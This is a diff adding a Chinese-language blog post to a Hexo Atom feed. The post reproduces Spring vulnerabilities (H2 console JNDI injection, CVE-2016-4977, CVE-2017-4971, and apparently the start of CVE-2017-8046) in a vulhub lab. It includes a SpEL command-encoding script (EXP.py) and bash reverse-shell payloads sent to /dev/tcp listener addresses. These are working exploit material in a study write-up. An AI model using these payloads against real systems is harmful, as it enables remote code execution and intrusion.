@@ -6,7 +6,7 @@
   <link href="https://lanxin-1.github.io/blog/atom.xml" rel="self"/>
   
   <link href="https://lanxin-1.github.io/blog/"/>
-  <updated>2022-08-16T11:40:34.868Z</updated>
+  <updated>2022-08-17T04:37:46.749Z</updated>
   <id>https://lanxin-1.github.io/blog/</id>
   
   <author>
@@ -15,6 +15,30 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Spring系列复现</title>
+    <link href="https://lanxin-1.github.io/blog/2022/08/17/Spring%E7%B3%BB%E5%88%97%E5%A4%8D%E7%8E%B0/"/>
+    <id>https://lanxin-1.github.io/blog/2022/08/17/Spring%E7%B3%BB%E5%88%97%E5%A4%8D%E7%8E%B0/</id>
+    <published>2022-08-17T04:32:12.000Z</published>
+    <updated>2022-08-17T04:37:46.749Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h2><h3 id="H2-Database-Console-未授权访问"><a href="#H2-Database-Console-未授权访问" class="headerlink" title="H2 Database Console 未授权访问"></a>H2 Database Console 未授权访问</h3><p>H2 database是一款Java内存数据库，自带一个Web管理页面，在Spirng开发中，如果设置如下选项，即可允许外部用户访问Web管理页面，且没有鉴权：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">spring.h2.console.enabled=true</span><br><span class="line">spring.h2.console.settings.web-allow-others=true</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">工具：https://github.com/welk1n/JNDI-Injection-Exploit</span><br><span class="line">流程：攻击机生成恶意类，靶机远程加载恶意类</span><br><span class="line"></span><br><span class="line">1.访问http://your-ip:8080/h2-console/</span><br><span class="line">2.使用JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar工具生成payload</span><br><span class="line">Java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C ‘命令’ -A 监听机IP</span><br><span class="line">tips：命令生成链接：https://forum.ywhack.com/shell.php    https://forum.ywhack.com/reverse-shell/</span><br><span class="line">3.DriverClass 填javax.naming.InitialContext</span><br><span class="line">4.JDBC URL填第二步中生成的rmi url</span><br></pre></td></tr></table></figure><h3 id="Spring-Security-OAuth2-RCE漏洞（CVE-2016-4977）"><a href="#Spring-Security-OAuth2-RCE漏洞（CVE-2016-4977）" class="headerlink" title="Spring Security OAuth2 RCE漏洞（CVE-2016-4977）"></a>Spring Security OAuth2 RCE漏洞（CVE-2016-4977）</h3><p>Spring Security OAuth 是为 Spring 框架提供安全认证支持的一个模块。在其使用 whitelabel views 来处理错误时，由于使用了Springs Expression Language (SpEL)，攻击者在被授权的情况下可以通过构造恶意参数来远程执行命令。</p><p>访问:</p><p><a href="http://your-ip:8080/oauth/authorize?response_type=$%7B233*233%7D&amp;client_id=acme&amp;scope=openid&amp;redirect_uri=http://test">http://your-ip:8080/oauth/authorize?response_type=${233*233}&amp;client_id=acme&amp;scope=openid&amp;redirect_uri=http://test</a></p><p>若SpEL表达式<code>$&#123;233*233&#125;</code>已经成功执行并返回结果则存在漏洞;</p><img src="/blog/2022/08/17/Spring%E7%B3%BB%E5%88%97%E5%A4%8D%E7%8E%B0/1.png" class title="uSu"> <p>使用EXP.py反弹shell,将EXP.py生成的SpEL替换,访问,即可成功反弹shell</p><img src="/blog/2022/08/17/Spring%E7%B3%BB%E5%88%97%E5%A4%8D%E7%8E%B0/2.png" class title="uSu"> <img src="/blog/2022/08/17/Spring%E7%B3%BB%E5%88%97%E5%A4%8D%E7%8E%B0/3.png" class title="uSu"> <p><strong>EXP.py</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">message = input(&#x27;Enter message to encode:&#x27;)</span><br><span class="line"></span><br><span class="line">exp = &#x27;$&#123;T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)&#x27; % ord(message[0])</span><br><span class="line"></span><br><span class="line">for ch in message[1:]:</span><br><span class="line">   exp += &#x27;.concat(T(java.lang.Character).toString(%s))&#x27; % ord(ch)</span><br><span class="line">exp += &#x27;)&#125;&#x27;</span><br><span class="line"></span><br><span class="line">with open(&#x27;exp.txt&#x27;, &#x27;w&#x27;) as f:</span><br><span class="line">   f.write(exp)</span><br></pre></td></tr></table></figure><h3 id="Spring-WebFlow-RCE漏洞（CVE-2017-4971）"><a href="#Spring-WebFlow-RCE漏洞（CVE-2017-4971）" class="headerlink" title="Spring WebFlow RCE漏洞（CVE-2017-4971）"></a>Spring WebFlow RCE漏洞（CVE-2017-4971）</h3><p>Spring WebFlow 是一个适用于开发基于流程的应用程序的框架（如购物逻辑），可以将流程的定义和实现流程行为的类和视图分离开来。在其 2.4.x 版本中，如果我们控制了数据绑定时的field，将导致一个SpEL表达式注入漏洞，最终造成任意命令执行。</p><p>复现环境：vulhub docker</p><p>访问 ip:8080/login       使用提供的账号登录</p><img src="/blog/2022/08/17/Spring%E7%B3%BB%E5%88%97%E5%A4%8D%E7%8E%B0/4.png" class title="uSu"> <p>登录-&gt;然后访问ip:8080/hotels/1 -&gt;Book hotel-&gt;&gt;提交信息-&gt;&gt;点击confirm抓这个包-&gt;&gt;添加字段payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_(new java.lang.ProcessBuilder(&quot;bash&quot;,&quot;-c&quot;,&quot;bash -i &gt;&amp; /dev/tcp/10.0.0.1/21 0&gt;&amp;1&quot;)).start()=vulhub</span><br><span class="line">需编码为:</span><br><span class="line">_(new java.lang.ProcessBuilder(&quot;bash&quot;,&quot;-c&quot;,&quot;bash+-i+&gt;%26+/dev/tcp/192.168.88.131/4455+0&gt;%261&quot;)).start()=vulhub</span><br></pre></td></tr></table></figure><img src="/blog/2022/08/17/Spring%E7%B3%BB%E5%88%97%E5%A4%8D%E7%8E%B0/5.png" class title="uSu"> <p>反弹shell成功</p><img src="/blog/2022/08/17/Spring%E7%B3%BB%E5%88%97%E5%A4%8D%E7%8E%B0/6.png" class title="uSu"> <h3 id="Spring-Data-Rest-RCE漏洞（CVE-2017-8046）"><a href="#Spring-Data-Rest-RCE漏洞（CVE-2017-8046）" class="headerlink" title="Spring Data Rest RCE漏洞（CVE-2017-8046）"></a>Spring Data Rest RCE漏洞（CVE-2017-8046）</h3><p>Spring Data REST是一个构建在Spring Data之上，为了帮助开发者更加容易地开发REST风格的Web服务。在REST API的Patch方法中（实现<a href="https://tools.ietf.org/html/rfc6902">RFC6902</a>），path的值被传入<code>setValue</code>，导致执行了SpEL表达式，触发远程命令执行漏洞。</p><p><strong>影响版本</strong></p><p>Spring Data REST 2.5.12, 2.6.7, 3.0 RC3之前的版本<br> Spring Boot 2.0.0M4之前的版本<br> Spring Data release trains Kay-RC3之前的版本</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;Spring&quot;&gt;&lt;a href=&quot;#Spring&quot; class=&quot;headerlink&quot; title=&quot;Spring&quot;&gt;&lt;/a&gt;Spring&lt;/h2&gt;&lt;h3 id=&quot;H2-Database-Console-未授权访问&quot;&gt;&lt;a href=&quot;#H2-Database-</summary>
+      
+    
+    
+    
+    <category term="漏洞复现" scheme="https://lanxin-1.github.io/blog/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+    
+    
+    <category term="spring" scheme="https://lanxin-1.github.io/blog/tags/spring/"/>
+    
+  </entry>
   
   <entry>
     <title>BlueTeam</title>
